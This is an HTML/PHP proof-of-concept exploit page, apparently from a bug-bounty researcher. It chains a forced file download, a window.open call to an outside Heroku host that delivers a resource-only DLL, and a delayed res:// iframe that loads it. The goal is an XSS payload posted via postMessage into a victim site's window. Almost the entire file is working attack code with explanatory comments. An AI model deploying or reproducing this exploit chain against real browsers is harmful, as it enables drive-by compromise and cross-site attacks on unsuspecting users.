<?php header('Content-Disposition: attachment; filename="evil.html"'); ?>
<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
	<title>

	</title>
</head>
<body>

<script type="text/javascript">
// Assuming that the victim accepts to download the file, no need to open it.
// This line could be altered with forcing download vulnerability if there is one.
// all of these can be automated smoothly if tehre is drive-by download on the vulnerable browser.
window.open('https://bughunt1307.herokuapp.com/evil.google.com');

// evil.google.com is resource only DLL file with a HTML resource containing the following code:
/*
<script>
var popup = window.open('https://whatever.victim.com/', 'XSS');
function post(){popup.postMessage("XSS payload goes here","*")}
setTimeout(post, 3000); 
<\/script> 
*/

// ref: https://docs.microsoft.com/en-us/cpp/build/creating-a-resource-only-dll?view=vs-2019

var ifr =  document.createElement('iframe');
ifr.src = 'res://C:\u005c\u005cUsers\u005c'+window.location.href.split('/')[5]+'\u005cDownloads\u005cevil.google.com/XSS'
function appendIfr(argument) {
	document.body.appendChild(ifr)
}
window.setTimeout(appendIfr, 4000);

</script>

<!--
<iframe src="res://C:\Users\1307\Desktop\RES-Project\evil.google.com/XSS" height="400" width="400"></iframe> 
<iframe src="res://C:\Windows\System32\mshtml.dll/PERFWIDGET.HTML" height="400" width="400"></iframe> 

-->

</body>
</html>
